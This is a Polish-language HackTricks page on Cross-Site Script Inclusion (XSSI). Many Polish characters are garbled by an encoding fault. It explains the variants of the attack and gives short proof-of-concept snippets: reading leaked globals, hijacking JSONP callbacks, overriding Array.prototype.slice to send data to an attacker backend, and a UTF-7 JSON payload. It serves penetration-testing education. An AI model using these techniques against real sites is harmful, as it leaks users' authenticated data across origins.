# XSSI (Cross-Site Script Inclusion)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Podstawowe informacje

**Cross-Site Script Inclusion (XSSI)** to podatno wynikajca z natury znacznika `script` w HTML. W przeciwiestwie do wikszoci zasob贸w, kt贸re podlegaj **Same-Origin Policy (SOP)**, skrypty mog by doczane z r贸偶nych domen. Zachowanie to ma uatwi korzystanie z bibliotek i innych zasob贸w hostowanych na r贸偶nych serwerach, ale wprowadza r贸wnie偶 potencjalne ryzyko bezpieczestwa.

### Kluczowe cechy **XSSI**:
- **Ominicie SOP**: Skrypty s zwolnione z **Same-Origin Policy**, co pozwala na ich doczanie midzy domenami.
- **Ujawnienie danych**: Atakujcy mo偶e wykorzysta to zachowanie do odczytywania danych wczytanych za pomoc znacznika `script`.
- **Wpyw na dynamiczny JavaScript/JSONP**: **XSSI** jest szczeg贸lnie istotne dla dynamicznego JavaScriptu lub **JSON z Paddingiem (JSONP)**. Te technologie czsto wykorzystuj informacje "ambient-authority" (takie jak ciasteczka) do uwierzytelniania. Gdy 偶danie skryptu jest wysyane do innego hosta, te powiadczenia (np. ciasteczka) s automatycznie doczane do 偶dania.
- **Wyciek tokena uwierzytelniajcego**: Jeli atakujcy mo偶e wprowadzi przegldark u偶ytkownika do wysania 偶dania skryptu do serwera, kt贸rym kontroluje, mo偶e mie dostp do wra偶liwych informacji zawartych w tych 偶daniach.

### Typy

1. **Statyczny JavaScript** - Reprezentuje konwencjonaln form XSSI.
2. **Statyczny JavaScript z uwierzytelnianiem** - Ten typ jest odrbny, poniewa偶 wymaga uwierzytelnienia do dostpu.
3. **Dynamiczny JavaScript** - Dotyczy JavaScriptu, kt贸ry dynamicznie generuje zawarto.
4. **Non-JavaScript** - Odnosi si do podatnoci, kt贸re nie dotycz bezporednio JavaScriptu.

**Nastpujce informacje s podsumowaniem [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Sprawd藕 go dla dalszych szczeg贸贸w.


### Regularne XSSI
W tym podejciu prywatne informacje s osadzone w globalnie dostpnym pliku JavaScript. Atakujcy mog zidentyfikowa te pliki za pomoc metod takich jak odczyt pliku, wyszukiwanie s贸w kluczowych lub wyra偶e regularnych. Po zlokalizowaniu skryptu zawierajcego poufne informacje, mo偶e on zosta doczony do zoliwej zawartoci, umo偶liwiajc nieautoryzowany dostp do wra偶liwych danych. Poni偶ej przedstawiono przykadow technik wykorzystania:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamiczne XSSI oparte na JavaScript i uwierzytelnione XSSI
Te rodzaje atak贸w XSSI polegaj na dynamicznym dodawaniu poufnych informacji do skryptu w odpowiedzi na 偶danie u偶ytkownika. Wykrycie mo偶na przeprowadzi, wysyajc 偶dania z i bez plik贸w cookie oraz por贸wnujc odpowiedzi. Jeli informacje r贸偶ni si, mo偶e to wskazywa na obecno poufnych informacji. Ten proces mo偶na zautomatyzowa za pomoc narzdzi takich jak rozszerzenie Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Jeli poufne dane s przechowywane w zmiennej globalnej, mo偶na je wykorzysta za pomoc podobnych metod do tych u偶ywanych w przypadku zwykego XSSI. Jednak jeli poufne dane s zawarte w odpowiedzi JSONP, atakujcy mog przej funkcj zwrotn, aby odzyska informacje. Mo偶na to zrobi poprzez manipulowanie obiektami globalnymi lub ustawienie funkcji do wykonania przez odpowied藕 JSONP, jak pokazano poni偶ej:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Dla zmiennych nie znajdujcych si w globalnej przestrzeni nazw, czasami mo偶na wykorzysta *modyfikacj prototypu*. Ta technika wykorzystuje konstrukcj jzyka JavaScript, w kt贸rej interpretacja kodu polega na przeszukiwaniu acucha prototyp贸w w celu zlokalizowania wywoanej waciwoci. Poprzez nadpisanie okrelonych funkcji, takich jak `slice` w obiekcie `Array`, atakujcy mog uzyska dostp i wyciec nieglobalne zmienne:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Dodatkowe informacje na temat wektor贸w ataku mo偶na znale藕 w pracy badawczej Sebastiana Lekiesa, kt贸ry prowadzi list wyciek贸w.

### Non-Script-XSSI
Badania Takeshi Terady wprowadzaj inn form XSSI, w kt贸rej pliki Non-Script, takie jak CSV, s wyciekane midzydomenowo poprzez doczanie ich jako 藕r贸de w tagu `script`. Historyczne przypadki XSSI, takie jak atak Jeremiaha Grossmana w 2006 roku, kt贸ry pozwala na odczytanie caej ksi偶ki adresowej Google, oraz wyciek danych JSON Joe Walkera z 2007 roku, podkrelaj powag tych zagro偶e. Dodatkowo, Gareth Heyes opisuje wariant ataku, w kt贸rym wykorzystuje si kodowanie UTF-7 JSON do uniknicia formatu JSON i wykonania skrypt贸w, co jest skuteczne w niekt贸rych przegldarkach:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
